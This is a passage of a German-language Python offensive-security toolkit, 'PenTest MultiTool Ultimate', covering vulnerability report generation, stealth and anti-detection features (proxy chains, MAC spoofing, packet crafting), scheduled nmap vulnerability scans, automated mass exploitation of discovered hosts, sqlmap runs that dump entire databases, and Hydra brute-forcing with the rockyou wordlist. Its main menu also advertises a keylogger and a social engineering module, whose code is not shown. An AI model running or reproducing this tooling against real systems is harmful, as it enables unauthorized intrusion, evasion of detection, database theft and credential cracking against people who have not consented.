        if any(keyword in output_lower for keyword in ['critical', 'remote code execution', 'rce']):
            return 'CRITICAL'
        elif any(keyword in output_lower for keyword in ['high', 'privilege escalation', 'sql injection']):
            return 'HIGH'
        elif any(keyword in output_lower for keyword in ['medium', 'xss', 'csrf']):
            return 'MEDIUM'
        elif any(keyword in output_lower for keyword in ['low', 'information disclosure']):
            return 'LOW'
        else:
            return 'UNKNOWN'

    def generate_html_vulnerability_report(self, vulnerabilities):
        """Generiert einen HTML Vulnerability Report"""
        # Gruppiere Schwachstellen nach Risiko-Level
        by_risk = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': [], 'UNKNOWN': []}
        for vuln in vulnerabilities:
            by_risk[vuln['risk']].append(vuln)
            
        # HTML Template
        html = f"""<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerability Report - {datetime.now().strftime('%Y-%m-%d')}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }}
        .header {{ text-align: center; margin-bottom: 30px; }}
        .summary {{ background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 30px; }}
        .vulnerability {{ margin-bottom: 20px; padding: 15px; border-radius: 5px; }}
        .critical {{ background: #f8d7da; border-left: 5px solid #dc3545; }}
        .high {{ background: #fff3cd; border-left: 5px solid #ffc107; }}
        .medium {{ background: #e3f2fd; border-left: 5px solid #2196f3; }}
        .low {{ background: #d4edda; border-left: 5px solid #28a745; }}
        .unknown {{ background: #e9ecef; border-left: 5px solid #6c757d; }}
        .risk-badge {{ padding: 3px 8px; border-radius: 3px; font-weight: bold; }}
        .risk-critical {{ background: #dc3545; color: white; }}
        .risk-high {{ background: #ffc107; color: black; }}
        .risk-medium {{ background: #2196f3; color: white; }}
        .risk-low {{ background: #28a745; color: white; }}
        .risk-unknown {{ background: #6c757d; color: white; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Vulnerability Assessment Report</h1>
        <p>Erstellt am: {datetime.now().strftime('%d.%m.%Y %H:%M')}</p>
        <p>Generiert von: PenTest MultiTool Ultimate</p>
    </div>
    
    <div class="summary">
        <h2>Zusammenfassung</h2>
        <p>Gesamtanzahl Schwachstellen: {len(vulnerabilities)}</p>
        <p>Kritisch: {len(by_risk['CRITICAL'])} | Hoch: {len(by_risk['HIGH'])} | Mittel: {len(by_risk['MEDIUM'])} | Niedrig: {len(by_risk['LOW'])}</p>
    </div>
"""
        
        # Füge Schwachstellen nach Risiko-Level hinzu
        for risk_level in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'UNKNOWN']:
            if by_risk[risk_level]:
                html += f'<h2>{risk_level} Risk Vulnerabilities</h2>'
                for vuln in by_risk[risk_level]:
                    html += f"""
                    <div class="vulnerability {risk_level.lower()}">
                        <h3><span class="risk-badge risk-{risk_level.lower()}">{risk_level}</span> 
                            {vuln['vulnerability']} auf {vuln['host']}:{vuln['port']}</h3>
                        <p><strong>Service:</strong> {vuln['service']}</p>
                        <p><strong>Details:</strong><br>{vuln['output']}</p>
                    </div>
                    """
        
        html += """
</body>
</html>
"""
        return html

    def auto_report_generation(self):
        """Automatische Report-Generierung basierend auf gesammelten Daten"""
        print("🤖 Starte automatische Report-Generierung...")
        
        # Sammle alle Daten
        scan_data = []
        for file in os.listdir(self.report_dir):
            if file.startswith('scan_') and file.endswith('.json'):
                with open(os.path.join(self.report_dir, file), 'r') as f:
                    scan_data.append(json.load(f))
                    
        # Analysiere Daten
        analysis = self.analyze_scan_data(scan_data)
        
        # Generiere automatischen Report
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = os.path.join(self.report_dir, f"auto_report_{timestamp}.html")
        
        html_content = self.generate_auto_report(analysis)
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
            
        print(f"✅ Automatischer Report gespeichert: {report_file}")

    def analyze_scan_data(self, scan_data):
        """Analysiert Scan-Daten für automatische Reports"""
        analysis = {
            'hosts': set(),
            'open_ports': 0,
            'vulnerabilities': [],
            'services': {},
            'risk_level': 'LOW'
        }
        
        for scan in scan_data:
            for host, host_data in scan.get('scan', {}).items():
                analysis['hosts'].add(host)
                
                for proto in ['tcp', 'udp']:
                    if proto in host_data:
                        for port, port_data in host_data[proto].items():
                            if port_data.get('state') == 'open':
                                analysis['open_ports'] += 1
                                
                                service = port_data.get('name', 'unknown')
                                if service not in analysis['services']:
                                    analysis['services'][service] = 0
                                analysis['services'][service] += 1
                                
                                if 'script' in port_data:
                                    for script_name, script_output in port_data['script'].items():
                                        if any(keyword in script_name.lower() for keyword in ['vuln', 'exploit', 'cve']):
                                            risk = self.calculate_risk_level(script_output)
                                            analysis['vulnerabilities'].append({
                                                'host': host,
                                                'port': port,
                                                'service': service,
                                                'vulnerability': script_name,
                                                'risk': risk
                                            })
        
        # Bestimme Gesamt-Risiko-Level
        risks = [vuln['risk'] for vuln in analysis['vulnerabilities']]
        if 'CRITICAL' in risks:
            analysis['risk_level'] = 'CRITICAL'
        elif 'HIGH' in risks:
            analysis['risk_level'] = 'HIGH'
        elif 'MEDIUM' in risks:
            analysis['risk_level'] = 'MEDIUM'
            
        return analysis

    # ==================== STEALTH & ANTI-DETECTION ====================
    def stealth_menu(self):
        """Erweitertes Stealth & Anti-Detection Menü"""
        while True:
            self.clear_screen()
            print("=" * 60)
            print("🕵️ ERWEITERTE STEALTH & ANTI-DETECTION")
            print("=" * 60)
            print("📋 Funktion: Verschleierungstechniken und Tarnmechanismen")
            print("💡 Verwendung: Reduzierung der Entdeckungswahrscheinlichkeit")
            print("=" * 60)
            print("1 - Stealth Mode aktivieren/deaktivieren")
            print("2 - Traffic-Verschleierung")
            print("3 - Scan-Zeitrandomisierung")
            print("4 - Proxy-Kette einrichten")
            print("5 - User-Agent Rotation")
            print("6 - MAC-Adressen-Spoofing")
            print("7 - DNS-Tunneling (simuliert)")
            print("8 - Packet Crafting")
            print("9 - Zurück zum Hauptmenü")
            print("=" * 60)
            
            choice = self.get_input("Auswahl: ")
            
            if choice == "1":
                self.toggle_stealth_mode()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "2":
                self.traffic_obfuscation()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "3":
                self.scan_randomization()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "4":
                self.proxy_chain_setup()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "5":
                self.user_agent_rotation()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "6":
                self.mac_spoofing()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "7":
                self.dns_tunneling()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "8":
                self.packet_crafting()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "9":
                break
                
            else:
                print("❌ Ungültige Auswahl")
                time.sleep(1)

    def toggle_stealth_mode(self):
        """Aktiviert/Deaktiviert den Stealth Mode"""
        self.stealth_mode = not self.stealth_mode
        status = "AKTIVIERT" if self.stealth_mode else "DEAKTIVIERT"
        print(f"✅ Stealth Mode {status}")
        
        if self.stealth_mode:
            print("💡 Alle Scans werden mit verringertem Tempo und randomisierten Parametern durchgeführt")
            print("💡 Traffic wird verschleiert und über verschiedene Wege geleitet")
        else:
            print("💡 Scans werden mit normaler Geschwindigkeit durchgeführt")
            
        # Update Konfiguration
        self.config['stealth']['enabled'] = self.stealth_mode
        self.save_config()

    def proxy_chain_setup(self):
        """Richtet eine Proxy-Kette ein"""
        print("🔗 Proxy-Ketten Einrichtung")
        print("📋 Verfügbare Proxy-Typen: http, https, socks4, socks5")
        
        proxies = []
        while True:
            proxy_type = self.get_input("Proxy-Typ (Enter zum Beenden): ").lower()
            if not proxy_type:
                break
                
            if proxy_type not in ['http', 'https', 'socks4', 'socks5']:
                print("❌ Ungültiger Proxy-Typ")
                continue
                
            proxy_host = self.get_input("Proxy-Host: ")
            proxy_port = self.get_input("Proxy-Port: ")
            proxy_user = self.get_input("Proxy-Benutzer (optional): ")
            proxy_pass = self.get_input("Proxy-Passwort (optional): ", secret=True)
            
            # Baue Proxy-URL
            if proxy_user and proxy_pass:
                proxy_url = f"{proxy_type}://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
            else:
                proxy_url = f"{proxy_type}://{proxy_host}:{proxy_port}"
                
            proxies.append(proxy_url)
            print(f"✅ Proxy hinzugefügt: {proxy_url}")
            
        self.proxy_chain = proxies
        print(f"✅ Proxy-Kette mit {len(proxies)} Proxies eingerichtet")
        
        # Aktiviere Proxy für Requests
        if proxies:
            self.config['stealth']['use_proxies'] = True
            self.save_config()

    def packet_crafting(self):
        """Packet Crafting für erweiterte Stealth-Funktionen"""
        print("📦 Packet Crafting")
        print("📋 Erstelle custom Netzwerkpakete für Stealth-Operationen")
        
        target = self.get_input("Ziel-IP: ")
        if not target:
            print("❌ Kein Ziel angegeben")
            return
            
        # Packet Crafting Optionen
        print("📋 Packet Crafting Optionen:")
        print("1 - TCP SYN Packet")
        print("2 - UDP Packet")
        print("3 - ICMP Packet")
        print("4 - Custom Packet")
        
        choice = self.get_input("Auswahl: ")
        
        try:
            if choice == "1":
                # Craft TCP SYN Packet
                packet = scapy.IP(dst=target)/scapy.TCP(dport=80, flags='S')
                print("🛠️ Crafting TCP SYN Packet...")
                
            elif choice == "2":
                # Craft UDP Packet
                packet = scapy.IP(dst=target)/scapy.UDP(dport=53)
                print("🛠️ Crafting UDP Packet...")
                
            elif choice == "3":
                # Craft ICMP Packet
                packet = scapy.IP(dst=target)/scapy.ICMP()
                print("🛠️ Crafting ICMP Packet...")
                
            elif choice == "4":
                # Custom Packet
                protocol = self.get_input("Protokoll (tcp/udp/icmp): ").lower()
                if protocol == 'tcp':
                    sport = int(self.get_input("Source Port: ") or random.randint(1024, 65535))
                    dport = int(self.get_input("Destination Port: ") or 80)
                    packet = scapy.IP(dst=target)/scapy.TCP(sport=sport, dport=dport, flags='S')
                elif protocol == 'udp':
                    sport = int(self.get_input("Source Port: ") or random.randint(1024, 65535))
                    dport = int(self.get_input("Destination Port: ") or 53)
                    packet = scapy.IP(dst=target)/scapy.UDP(sport=sport, dport=dport)
                elif protocol == 'icmp':
                    packet = scapy.IP(dst=target)/scapy.ICMP()
                else:
                    print("❌ Ungültiges Protokoll")
                    return
                    
            else:
                print("❌ Ungültige Auswahl")
                return
                
            # Sende Packet
            response = scapy.sr1(packet, timeout=2, verbose=0)
            
            if response:
                print(f"✅ Antwort erhalten von {target}")
                print(f"   Source: {response.src}")
                print(f"   Protocol: {response.proto}")
                
                if response.haslayer(scapy.TCP):
                    print(f"   TCP Flags: {response[scapy.TCP].flags}")
            else:
                print("❌ Keine Antwort erhalten")
                
        except Exception as e:
            print(f"❌ Fehler beim Packet Crafting: {e}")
            logger.error(f"Packet crafting error: {e}")

    # ==================== AUTOMATION & BATCH PROCESSING ====================
    def automation_menu(self):
        """Erweitertes Automation & Batch Processing Menü"""
        while True:
            self.clear_screen()
            print("=" * 60)
            print("🤖 ERWEITERTE AUTOMATION & BATCH PROCESSING")
            print("=" * 60)
            print("📋 Funktion: Automatisierte Skriptausführung und Batch-Verarbeitung")
            print("💡 Verwendung: Massen-Scans und automatisierte Workflows")
            print("=" * 60)
            print("1 - Ziel-Liste importieren")
            print("2 - Automatischen Scan-Workflow erstellen")
            print("3 - Scheduled Scanning")
            print("4 - Ergebnisse automatisch zusammenfassen")
            print("5 - Custom Scripts ausführen")
            print("6 - Massen-Exploitation")
            print("7 - Zurück zum Hauptmenü")
            print("=" * 60)
            
            choice = self.get_input("Auswahl: ")
            
            if choice == "1":
                self.import_target_list()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "2":
                self.create_scan_workflow()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "3":
                self.scheduled_scanning()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "4":
                self.auto_consolidate_results()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "5":
                self.execute_custom_scripts()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "6":
                self.mass_exploitation()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "7":
                break
                
            else:
                print("❌ Ungültige Auswahl")
                time.sleep(1)

    def scheduled_scanning(self):
        """Planet Scans für automatische Ausführung"""
        print("⏰ Scheduled Scanning")
        
        target = self.get_input("Ziel-IP oder Hostname: ")
        if not target:
            print("❌ Kein Ziel angegeben")
            return
            
        # Scan-Typ auswählen
        print("📋 Scan-Typ:")
        print("1 - Port Scan")
        print("2 - Vulnerability Scan")
        print("3 - Web Application Scan")
        print("4 - Vollständiger Scan")
        
        scan_type = self.get_input("Auswahl: ")
        scan_types = {
            '1': 'port_scan',
            '2': 'vulnerability_scan',
            '3': 'web_scan',
            '4': 'full_scan'
        }
        
        if scan_type not in scan_types:
            print("❌ Ungültige Auswahl")
            return
            
        # Zeitplanung
        print("📅 Zeitplanung:")
        print("1 - Einmalig")
        print("2 - Täglich")
        print("3 - Wöchentlich")
        print("4 - Monatlich")
        
        schedule_type = self.get_input("Auswahl: ")
        
        # Zeitpunkt
        if schedule_type == '1':
            schedule_time = self.get_input("Zeitpunkt (HH:MM): ")
        else:
            schedule_time = self.get_input("Uhrzeit (HH:MM): ")
            
        # Erstelle Scheduled Task
        schedule_config = {
            'target': target,
            'scan_type': scan_types[scan_type],
            'schedule': schedule_type,
            'time': schedule_time,
            'enabled': True
        }
        
        # Speichere Schedule
        schedules_file = os.path.join(self.data_dir, "schedules.json")
        schedules = []
        
        if os.path.exists(schedules_file):
            with open(schedules_file, 'r') as f:
                schedules = json.load(f)
                
        schedules.append(schedule_config)
        
        with open(schedules_file, 'w') as f:
            json.dump(schedules, f, indent=4)
            
        print(f"✅ Scan geplant für {target} ({scan_types[scan_type]})")
        
        # Starte Scheduler Thread falls nicht bereits gestartet
        if not hasattr(self, 'scheduler_thread') or not self.scheduler_thread.is_alive():
            self.scheduler_thread = threading.Thread(target=self.run_scheduler, daemon=True)
            self.scheduler_thread.start()
            print("✅ Scheduler gestartet")

    def run_scheduler(self):
        """Führt geplante Scans aus"""
        schedules_file = os.path.join(self.data_dir, "schedules.json")
        
        while True:
            try:
                if os.path.exists(schedules_file):
                    with open(schedules_file, 'r') as f:
                        schedules = json.load(f)
                        
                    current_time = datetime.now().strftime('%H:%M')
                    current_day = datetime.now().weekday()  # 0 = Monday, 6 = Sunday
                    
                    for schedule in schedules:
                        if schedule['enabled'] and schedule['time'] == current_time:
                            # Überprüfe Schedule-Typ
                            if schedule['schedule'] == '1':  # Einmalig
                                self.execute_scheduled_scan(schedule)
                                schedule['enabled'] = False  # Deaktiviere nach Ausführung
                                
                            elif schedule['schedule'] == '2':  # Täglich
                                self.execute_scheduled_scan(schedule)
                                
                            elif schedule['schedule'] == '3' and current_day == 0:  # Wöchentlich (Montag)
                                self.execute_scheduled_scan(schedule)
                                
                            elif schedule['schedule'] == '4' and datetime.now().day == 1:  # Monatlich (1. des Monats)
                                self.execute_scheduled_scan(schedule)
                                
                    # Speichere aktualisierte Schedules
                    with open(schedules_file, 'w') as f:
                        json.dump(schedules, f, indent=4)
                        
            except Exception as e:
                logger.error(f"Scheduler error: {e}")
                
            time.sleep(60)  # Überprüfe jede Minute

    def execute_scheduled_scan(self, schedule):
        """Führt einen geplanten Scan aus"""
        try:
            target = schedule['target']
            scan_type = schedule['scan_type']
            
            print(f"⏰ Führe geplanten Scan aus: {scan_type} auf {target}")
            
            if scan_type == 'port_scan':
                nm = nmap.PortScanner()
                nm.scan(target, arguments="-T4")
                self.save_scan_results(nm, target, "scheduled_port_scan")
                
            elif scan_type == 'vulnerability_scan':
                nm = nmap.PortScanner()
                nm.scan(target, arguments="-sV --script vuln")
                self.save_scan_results(nm, target, "scheduled_vuln_scan")
                
            elif scan_type == 'web_scan':
                if not target.startswith('http'):
                    target = 'http://' + target
                self.advanced_web_crawler_target(target)
                
            elif scan_type == 'full_scan':
                nm = nmap.PortScanner()
                nm.scan(target, arguments="-sS -sV -O --script vuln")
                self.save_scan_results(nm, target, "scheduled_full_scan")
                
            print(f"✅ Geplanter Scan abgeschlossen: {scan_type} auf {target}")
            
        except Exception as e:
            logger.error(f"Scheduled scan error: {e}")

    def mass_exploitation(self):
        """Massen-Exploitation von gefundenen Schwachstellen"""
        print("💣 Massen-Exploitation")
        
        # Lade Vulnerability Reports
        vuln_files = [f for f in os.listdir(self.report_dir) if f.startswith('vulnerability_report_')]
        
        if not vuln_files:
            print("❌ Keine Vulnerability Reports gefunden")
            return
            
        # Lade neuesten Report
        latest_file = max(vuln_files, key=lambda f: os.path.getctime(os.path.join(self.report_dir, f)))
        with open(os.path.join(self.report_dir, latest_file), 'r') as f:
            vuln_data = json.load(f)
            
        # Filtere nach kritischen Schwachstellen
        critical_vulns = [v for v in vuln_data if v['risk'] in ['CRITICAL', 'HIGH']]
        
        if not critical_vulns:
            print("❌ Keine kritischen Schwachstellen gefunden")
            return
            
        print(f"🔍 Gefundene {len(critical_vulns)} kritische Schwachstellen:")
        for i, vuln in enumerate(critical_vulns, 1):
            print(f"   {i}. {vuln['host']}:{vuln['port']} - {vuln['vulnerability']}")
            
        # Wähle Exploitation-Methode
        print("📋 Exploitation-Methoden:")
        print("1 - Automatische Exploitation")
        print("2 - Metasploit Integration")
        print("3 - Custom Exploit Script")
        
        method = self.get_input("Auswahl: ")
        
        if method == "1":
            self.auto_exploitation(critical_vulns)
        elif method == "2":
            self.metasploit_exploitation(critical_vulns)
        elif method == "3":
            self.custom_exploit(critical_vulns)
        else:
            print("❌ Ungültige Auswahl")

    def auto_exploitation(self, vulnerabilities):
        """Automatische Exploitation von Schwachstellen"""
        print("🤖 Starte automatische Exploitation...")
        
        for vuln in vulnerabilities:
            print(f"🔓 Versuche Exploitation: {vuln['host']}:{vuln['port']}")
            
            # Basierend auf Schwachstellentyp verschiedene Exploits versuchen
            vuln_type = vuln['vulnerability'].lower()
            
            if 'http' in vuln_type or 'web' in vuln_type:
                self.exploit_web_vulnerability(vuln)
            elif 'ftp' in vuln_type:
                self.exploit_ftp_vulnerability(vuln)
            elif 'smb' in vuln_type or 'windows' in vuln_type:
                self.exploit_smb_vulnerability(vuln)
            elif 'ssh' in vuln_type:
                self.exploit_ssh_vulnerability(vuln)
            else:
                print(f"   ⚠️  Kein spezifischer Exploit für {vuln_type} verfügbar")
                
        print("✅ Automatische Exploitation abgeschlossen")

    # ==================== EXTERNE TOOL INTEGRATION ====================
    def external_tools_menu(self):
        """Erweitertes Externe Tool Integration Menü"""
        while True:
            self.clear_screen()
            print("=" * 60)
            print("🔗 ERWEITERTE EXTERNE TOOL INTEGRATION")
            print("=" * 60)
            print("📋 Funktion: Integration mit populären Security-Tools")
            print("💡 Verwendung: Erweiterte Funktionalität durch externe Tools")
            print("=" * 60)
            print("1 - Metasploit Integration")
            print("2 - Burp Suite Integration")
            print("3 - OWASP ZAP Integration")
            print("4 - Nikto Scanner")
            print("5 - SQLMap Integration")
            print("6 - John the Ripper Integration")
            print("7 - Hydra Integration")
            print("8 - Zurück zum Hauptmenü")
            print("=" * 60)
            
            choice = self.get_input("Auswahl: ")
            
            if choice == "1":
                self.metasploit_integration()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "2":
                self.burp_suite_integration()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "3":
                self.zap_integration()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "4":
                self.nikto_scanner()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "5":
                self.sqlmap_integration()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "6":
                self.john_integration()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "7":
                self.hydra_integration()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "8":
                break
                
            else:
                print("❌ Ungültige Auswahl")
                time.sleep(1)

    def sqlmap_integration(self):
        """SQLMap Integration für automatische SQL Injection Tests"""
        print("🗃️ SQLMap Integration")
        
        url = self.get_input("Ziel-URL mit Parameter: ")
        if not url:
            print("❌ Keine URL angegeben")
            return
            
        # Überprüfe ob SQLMap verfügbar ist
        sqlmap_path = self.config['external_tools'].get('sqlmap_path', 'sqlmap')
        
        try:
            result = subprocess.run([sqlmap_path, '--version'], capture_output=True, text=True, timeout=10)
            if 'sqlmap' not in result.stdout.lower():
                print("❌ SQLMap nicht gefunden")
                print("💡 Installieren Sie SQLMap: pip install sqlmap")
                return
                
            print("✅ SQLMap gefunden - Starte Test...")
            
            # SQLMap Parameter
            params = [
                sqlmap_path, '-u', url, '--batch', '--level', '3', '--risk', '3',
                '--dbs', '--tables', '--dump-all'
            ]
            
            # Proxy support
            if self.proxy_chain:
                params.extend(['--proxy', self.proxy_chain[0]])
                
            # Führe SQLMap aus
            process = subprocess.Popen(params, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            
            # Speichere Ergebnisse
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report_file = os.path.join(self.report_dir, f"sqlmap_scan_{timestamp}.txt")
            
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(f"SQLMap Scan Report for {url}\n")
                f.write(f"Date: {datetime.now()}\n")
                f.write("\nSTDOUT:\n")
                f.write(stdout.decode('utf-8', errors='ignore'))
                f.write("\nSTDERR:\n")
                f.write(stderr.decode('utf-8', errors='ignore'))
                
            print(f"✅ SQLMap Scan abgeschlossen. Ergebnisse: {report_file}")
            
        except (subprocess.TimeoutExpired, FileNotFoundError):
            print("❌ SQLMap nicht installiert oder nicht im PATH")
            print("💡 Installieren Sie SQLMap: pip install sqlmap")

    def hydra_integration(self):
        """Hydra Integration für Brute-Force Attacks"""
        print("🔐 Hydra Integration")
        
        target = self.get_input("Ziel-IP oder Hostname: ")
        if not target:
            print("❌ Kein Ziel angegeben")
            return
            
        service = self.get_input("Service (ssh, ftp, http-form, etc.): ")
        if not service:
            print("❌ Kein Service angegeben")
            return
            
        # Überprüfe ob Hydra verfügbar ist
        try:
            result = subprocess.run(['hydra', '--version'], capture_output=True, text=True, timeout=5)
            if 'hydra' not in result.stdout.lower():
                print("❌ Hydra nicht gefunden")
                print("💡 Installieren Sie Hydra: sudo apt install hydra")
                return
                
            print("✅ Hydra gefunden - Starte Brute-Force...")
            
            # Wordlist auswählen
            wordlist_dir = self.wordlists_dir
            if not os.path.exists(wordlist_dir):
                os.makedirs(wordlist_dir)
                
            print(f"📁 Wordlists-Verzeichnis: {wordlist_dir}")
            print("💡 Platzieren Sie Wordlists in diesem Verzeichnis")
            
            user_wordlist = self.get_input("Username Wordlist (optional): ")
            pass_wordlist = self.get_input("Password Wordlist (optional): ")
            
            # Baue Hydra Command
            params = ['hydra', '-L', user_wordlist or '/usr/share/wordlists/metasploit/unix_users.txt',
                     '-P', pass_wordlist or '/usr/share/wordlists/rockyou.txt',
                     target, service]
            
            # Führe Hydra aus
            process = subprocess.Popen(params, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            
            # Speichere Ergebnisse
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report_file = os.path.join(self.report_dir, f"hydra_scan_{target}_{service}_{timestamp}.txt")
            
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(f"Hydra Brute-Force Report for {target} ({service})\n")
                f.write(f"Date: {datetime.now()}\n")
                f.write("\nSTDOUT:\n")
                f.write(stdout.decode('utf-8', errors='ignore'))
                f.write("\nSTDERR:\n")
                f.write(stderr.decode('utf-8', errors='ignore'))
                
            print(f"✅ Hydra Scan abgeschlossen. Ergebnisse: {report_file}")
            
        except (subprocess.TimeoutExpired, FileNotFoundError):
            print("❌ Hydra nicht installiert")
            print("💡 Installieren Sie Hydra: sudo apt install hydra")

    # ==================== HAUPTMENÜ ====================
    def show_main_menu(self):
        """Hauptmenü des Tools"""
        while True:
            self.clear_screen()
            print("=" * 60)
            print("🎯 PENETRATION TEST MULTITOOL ULTIMATE - BY BUMSCROSS")
            print("=" * 60)
            print("📚 1 - Tutorial & Education")
            print("🔑 2 - Keylogger Modul")
            print("🔍 3 - System Scan Modul")
            print("🌐 4 - Netzwerk Modul (ERWEITERT)")
            print("🎭 5 - Social Engineering Modul")
            print("🔓 6 - Hash & Cracking Modul")
            print("⚡ 7 - Advanced Tools Modul (ERWEITERT)")
            print("🕵️ 8 - Stealth & Anti-Detection (ERWEITERT)")
            print("🤖 9 - Automation & Batch Processing (ERWEITERT)")
            print("🔗 10 - Externe Tool Integration (ERWEITERT)")
            print("📊 11 - Report Generation (ERWEITERT)")
            print("❌ 0 - Beenden")
            print("=" * 60)
            
            choice = self.get_input("Auswahl: ")
            
            if choice == "1":
                self.tutorial_menu()
                
            elif choice == "2":
                self.keylogger_menu()
                
            elif choice == "3":
                self.system_scan_menu()
                
            elif choice == "4":
                self.port_scanner_menu()
                
            elif choice == "5":
                self.social_engineering_menu()
                
            elif choice == "6":
                self.hash_cracking_menu()
                
            elif choice == "7":
                self.advanced_tools_menu()
                
            elif choice == "8":
                self.stealth_menu()
                
            elif choice == "9":
                self.automation_menu()
                
            elif choice == "10":
                self.external_tools_menu()
                
            elif choice == "11":
                self.report_generation_menu()
                
            elif choice == "0":
                if self.is_keylogging:
                    self.stop_keylogger()
                print("👋 Beende PenTest MultiTool...")
                break
                
            else:
                print("❌ Ungültige Auswahl")
                time.sleep(1)

def show_banner():
    """Zeigt das ASCII-Banner"""
    banner = r"""
██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   
██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   
██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   
╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   
                                                             
███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗██╗   ██╗██╗  
██╗     ███████╗██╗     ████████╗██╗ ██████╗ ███╗   ██╗ ██████╗ ███████╗
██║     ██╔════╝██║     ╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝ ██╔════╝
██║     █████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║██║  ███╗█████╗  
██║     ██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║██║   ██║██╔══╝  
███████╗███████╗███████╗   ██║   ██║╚██████╔╝██║ ╚████║╚██████╔╝███████╗
╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
                                                                         
███████╗██╗   ██╗██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗              
██╔════╝██║   ██║██║  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝              
███████╗██║   ██║███████║██║   ██║██████╔╝█████╗  ███████╗              
╚════██║██║   ██║██╔══██║██║   ██║██╔═══╝ ██╔══╝  ╚════██║              
███████║╚██████╔╝██║  ██║╚██████╔╝██║     ███████╗███████║              
╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝              
                                                                         
    """
    print(banner)
    print("🚀 Version 3.0 - Ultimate Edition")
    print("🔧 Entwickelt von Bumscross")
    print("📧 Contact: bumscross@protonmail.com")
    print("=" * 60)
    time.sleep(2)

# ==================== TUTORIAL & EDUCATION ====================
def tutorial_menu(self):
    """Tutorial und Bildungsmodul"""
    while True:
        self.clear_screen()
        print("=" * 60)
        print("📚 TUTORIAL & EDUCATION MODULE")
        print("=" * 60)
        print("1 - Penetration Testing Grundlagen")
        print("2 - Ethical Hacking Tutorials")
        print("3 - Sicherheitskonzepte erklärt")
        print("4 - Tool-Verwendung Tutorials")
        print("5 - Zurück zum Hauptmenü")
        print("=" * 60)
        
        choice = self.get_input("Auswahl: ")
        
        if choice == "1":
            self.show_tutorial("pentest_basics")
        elif choice == "2":
            self.show_tutorial("ethical_hacking")
        elif choice == "3":
            self.show_tutorial("security_concepts")
        elif choice == "4":
            self.show_tutorial("tool_tutorials")
        elif choice == "5":
            break
        else:
            print("❌ Ungültige Auswahl")
            time.sleep(1)

def show_tutorial(self, tutorial_type):
    """Zeigt verschiedene Tutorials an"""
    tutorials = {
        "pentest_basics": [
            "📖 Was ist Penetration Testing?",
            "📖 Phasen eines Penetration Tests",
            "📖 Reconnaissance Techniken",
            "📖 Scanning Methodologien",
            "📖 Exploitation Grundlagen",
            "📖 Post-Exploitation",
            "📖 Reporting und Dokumentation"
        ],
        "ethical_hacking": [
            "📖 Ethical Hacking Prinzipien",
            "📖 Legal und Compliance",
            "📖 Verantwortungsvolle Offenlegung",
            "📖 Bug Bounty Programme",
            "📖 Certifications (CEH, OSCP)"
        ],
        "security_concepts": [
            "📖 OWASP Top 10",
            "📖 Netzwerksicherheit",
            "📖 Web Application Security",
            "📖 Cryptography Grundlagen",
            "📖 Social Engineering"
        ],
        "tool_tutorials": [
            "📖 Nmap Tutorial",
            "📖 Metasploit Guide",
            "📖 Burp Suite Usage",
            "📖 Wireshark Tutorial",
            "📖 SQLMap Anleitung"
        ]
    }
    
    print(f"📚 {tutorial_type.replace('_', ' ').title()}")
    print("=" * 40)
    for i, topic in enumerate(tutorials.get(tutorial_type, []), 1):
        print(f"{i}. {topic}")
    
